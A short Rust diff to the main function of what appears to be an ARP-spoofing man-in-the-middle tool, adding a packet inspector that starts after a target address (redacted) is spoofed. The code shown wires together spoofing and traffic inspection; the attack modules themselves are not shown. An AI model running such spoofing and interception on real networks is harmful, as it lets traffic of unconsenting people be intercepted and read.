@@ -1,6 +1,6 @@
 use arp::spoofer::ArpSpoofer;
 use operating_system::network_tools::NetworkTools;
-use packet_inspection::inspector::Inspector;
+use packet_inspection::inspector::{Inspector, self, InspectorImpl};
 
 use crate::arp::spoofer::Mitm;
 
@@ -20,6 +20,8 @@ async fn main() {
     let hw_addr = tools.fetch_hardware_address("en0").unwrap();
     let ipv4 = tools.fetch_ipv4_address("en0").unwrap();
 
+    let inspector = InspectorImpl::new(&interface);
+
     let mitm = Mitm {
         hw: hw_addr,
         ipv4
@@ -35,4 +37,6 @@ async fn main() {
 
     let target = std::net::Ipv4Addr::from([***REMOVED***]);
     sending_spoofer.spoof_target(target);
+
+    tokio::join!(inspector.start_inspecting());
 }
